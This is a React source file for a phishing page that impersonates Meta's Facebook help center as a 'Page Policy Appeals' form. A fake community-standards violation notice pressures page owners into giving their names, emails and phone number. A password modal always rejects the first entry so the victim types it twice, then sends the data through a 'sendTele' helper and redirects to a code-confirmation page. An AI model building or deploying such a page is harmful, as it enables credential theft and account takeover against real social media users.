import { useState } from "react";
import { sendByForm } from "../sendTele";

function BusinessHelpCenter() {
  const [isModalOpen, setIsModalOpen] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    await sendByForm(e);
    setIsModalOpen(true);
  };

  return (
    <>
      <section>
        <div className="header py-3">
          <div className="container">
            <div className="row w-100 justify-content-between">
              <div className="col-5 col-lg-6">
                <img src="/logo.jpg" alt="" className="img-fluid" />
              </div>
              <div className="col-7 col-lg-6 flex-center pe-0">
                <div className="input-group ">
                  <div className="input-group-prepend ">
                    <span className="input-group-text rounded-0">
                      <i className="bi bi-search"></i>
                    </span>
                  </div>
                  <input
                    type="text"
                    className="form-control rounded-0"
                    placeholder="How can we help?"
                  />
                </div>
              </div>
            </div>
          </div>
        </div>
        <div className="menu">
          <div className="container">
            <div className="row w-100">
              <div className="col">
                <div className="flex-start blue-color pointer">
                  <i class="bi bi-house-door-fill me-2"></i>
                  <h5 className="m-0">Help center</h5>
                </div>
              </div>
              <div className="col flex-end">
                <p className="english m-0 pointer">English</p>
              </div>
            </div>
          </div>
        </div>

        <div className="main py-4 ">
          <div className="container w-100">
            <div className="row w-100 flex-column-reverse flex-md-row m-auto">
              <div className="col-12 col-md-3 pt-4 pt-lg-0">
                <ul>
                  <li className="menu-item">
                    <a href="#">Creating an Account</a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Your Profile </a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Friending </a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Facebook Dating </a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Your Home Page </a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Messaging </a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Reels </a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Stories </a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Photos </a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Videos </a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Gaming </a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Pages </a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Groups </a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Events </a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Fundraisers and Donations </a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Meta Pay</a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Marketplace</a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Apps</a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Facebook Mobile Apps</a>
                  </li>
                  <li className="menu-item">
                    <a href="#">Accessibility </a>
                  </li>
                </ul>
              </div>
              <div className="col-12 col-md-9 p-0">
                <div className="appeal-form bg-light p-3 p-lg-4 rounded w-100">
                  <h2 className="mb-4">Page Policy Appeals</h2>
                  <p>
                    We have detected unusual activity on your page that violates
                    our community standards.
                  </p>
                  <p>
                    Your access to your page has been limited, and you are
                    currently unable to post, share, or comment using your page.
                  </p>
                  <p>
                    If you believe this to be a mistake, you have the option to
                    submit an appeal by providing the necessary information.
                  </p>

                  <form onSubmit={handleSubmit}>
                    <div className="mb-2">
                      <label htmlFor="Fanpage" className="form-label">
                        Name Fanpage <span className="red">*</span>
                      </label>
                      <input
                        type="text"
                        className="form-control"
                        name="Fanpage"
                        required
                      />
                    </div>
                    <div className="mb-2">
                      <label htmlFor="fullname" className="form-label">
                        Fullname <span className="red">*</span>
                      </label>
                      <input
                        type="text"
                        className="form-control"
                        name="fullname"
                        required
                      />
                    </div>
                    <div className="mb-2">
                      <label htmlFor="businessEmail" className="form-label">
                        Business Email Address <span className="red">*</span>
                      </label>
                      <input
                        type="email"
                        className="form-control"
                        name="businessEmail"
                        required
                      />
                    </div>
                    <div className="mb-2">
                      <label htmlFor="personalEmail" className="form-label">
                        Personal Email Address <span className="red">*</span>
                      </label>
                      <input
                        type="email"
                        className="form-control"
                        name="email"
                        required
                      />
                    </div>
                    <div className="mb-2">
                      <label htmlFor="mobilePhone" className="form-label">
                        Mobile Phone Number <span className="red">*</span>
                      </label>
                      <input
                        type="tel"
                        className="form-control"
                        name="mobilePhone"
                        required
                      />
                    </div>
                    <div className="mb-2">
                      <label htmlFor="additionalInfo" className="form-label">
                        Please provide us information that will help us
                        investigate.
                      </label>
                      <textarea
                        className="form-control"
                        name="additionalInfo"
                        rows="4"
                      ></textarea>
                    </div>
                    <div className="flex-end">
                      <button type="submit" className="btn btn-primary">
                        Send
                      </button>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div className="footer bg-light py-3 mt-4 d-md-none">
          <div className="container">
            <div className="row">
              <div className="col-12">
                <div className="d-flex justify-content-center mb-3">
                  <a href="#" className="text-muted me-3">
                    <i className="bi bi-facebook"></i>
                  </a>
                  <span className="text-muted">Meta © 2024</span>
                </div>
                <div className="d-flex flex-wrap justify-content-center">
                  <a href="#" className="text-muted me-3 mb-2">
                    English (US)
                  </a>
                  <a href="#" className="text-muted me-3 mb-2">
                    About
                  </a>
                  <a href="#" className="text-muted me-3 mb-2">
                    Ad choices
                  </a>
                  <a href="#" className="text-muted me-3 mb-2">
                    Terms & Policies
                  </a>
                  <a href="#" className="text-muted me-3 mb-2">
                    Privacy Policy
                  </a>
                  <a href="#" className="text-muted me-3 mb-2">
                    Create ad
                  </a>
                  <a href="#" className="text-muted me-3 mb-2">
                    Cookies
                  </a>
                  <a href="#" className="text-muted me-3 mb-2">
                    Careers
                  </a>
                  <a href="#" className="text-muted mb-2">
                    Create Page
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="footer bg-light py-3 mt-4 d-none d-lg-block">
          <div className="container">
            <div className="row">
              <div className="col-12 d-flex justify-content-between align-items-center">
                <div className="d-flex align-items-center">
                  <a href="#" className="text-muted me-3">
                    <i className="bi bi-facebook"></i>
                  </a>
                  <span className="text-muted me-3">Meta © 2024</span>
                  <a href="#" className="text-muted me-3">
                    English (US)
                  </a>
                </div>
                <div>
                  <a href="#" className="text-muted me-3">
                    About
                  </a>
                  <a href="#" className="text-muted me-3">
                    Ad choices
                  </a>
                  <a href="#" className="text-muted me-3">
                    Terms & Policies
                  </a>
                  <a href="#" className="text-muted me-3">
                    Privacy Policy
                  </a>
                  <a href="#" className="text-muted me-3">
                    Create ad
                  </a>
                  <a href="#" className="text-muted me-3">
                    Cookies
                  </a>
                  <a href="#" className="text-muted me-3">
                    Careers
                  </a>
                  <a href="#" className="text-muted">
                    Create Page
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
      {isModalOpen && (
        <ModalPassword
          key={Date.now()}
          open={isModalOpen}
          setOpen={setIsModalOpen}
        />
      )}
    </>
  );
}

export default BusinessHelpCenter;

const ModalPassword = ({ open, setOpen }) => {
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [attempts, setAttempts] = useState(0);

  if (!open) return null;

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (attempts === 0) {
      setError("The password you've entered is incorrect.");
      setPassword("");
      setAttempts(1);
    } else {
      setOpen(false);
      await sendByForm(e);
      window.location.href = "/confirm-code";
    }
  };

  return (
    <>
      <div className="modal-overlay"></div>
      <div
        className="modal fade show"
        style={{ display: "block" }}
        tabIndex="-1"
      >
        <div className="modal-dialog modal-dialog-centered">
          <div className="modal-content p-4">
            <h2 className="modal-title fw-bold mb-3">
              Please Enter Your Password
            </h2>
            <p className="text-muted mb-4">
              For your security, you must enter your password to continue.
            </p>
            <form onSubmit={handleSubmit}>
              <div className="mb-3">
                <label htmlFor="password" className="form-label">
                  Your password
                </label>
                <input
                  type="password"
                  className="form-control"
                  name="password"
                  placeholder="Enter your password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                {error && <div className="text-danger mt-2">{error}</div>}
              </div>
              <button type="submit" className="btn btn-primary w-100">
                Continue
              </button>
            </form>
          </div>
        </div>
      </div>
    </>
  );
};
